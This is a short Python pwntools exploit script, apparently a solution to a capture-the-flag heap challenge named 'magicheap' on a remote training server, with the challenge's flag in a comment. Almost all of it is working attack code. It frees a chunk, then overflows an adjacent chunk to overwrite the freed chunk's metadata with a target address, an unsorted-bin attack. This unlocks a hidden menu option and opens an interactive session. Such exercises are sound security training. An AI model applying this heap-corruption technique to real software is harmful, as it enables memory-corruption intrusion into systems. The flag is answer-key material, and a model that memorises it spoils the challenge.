#!/usr/bin/env python
from pwn import *

# FLAG{MAGICMAGICmagicmagic}

e , l = ELF( './magicheap-033333be91a77ff2041c2b3f7d5906007ef132e3' ) , ELF( './libc.so.6-14c22be9aa11316f89909e4237314e009da38883' )

host , port = 'csie.ctf.tw' , 10144
y = remote( host , port )


def cre( size , data ):
    y.sendafter( 'ice :' , '1' )
    y.sendafter( ':' , str( size ) )
    y.sendafter( ':' , data )

def edit( idx , size , data ):
    y.sendafter( 'ice :' , '2' )
    y.sendafter( ':' , str( idx ) )
    y.sendafter( ':' , str( size ) )
    y.sendafter( ':' , data )

def dle( idx ):
    y.sendafter( 'ice :' , '3' )
    y.sendafter( ':' , str( idx ) )

def magic():
    y.sendafter( 'ice :' , '4869' )



cre( 0x200 , 'yuawn' )
cre( 0x300 , 'yuawn' )
cre( 0x200 , 'yuawn' )

dle( 1 )

edit( 0 , 0x340 , 'Y' * 0x200 + p64( 0x0 ) + p64( 0x310 ) + p64( 0x7777777 ) + p64( 0x6020c0 - 0x10 ) )

cre( 0x300 , 'yuawn' )

magic()

y.interactive()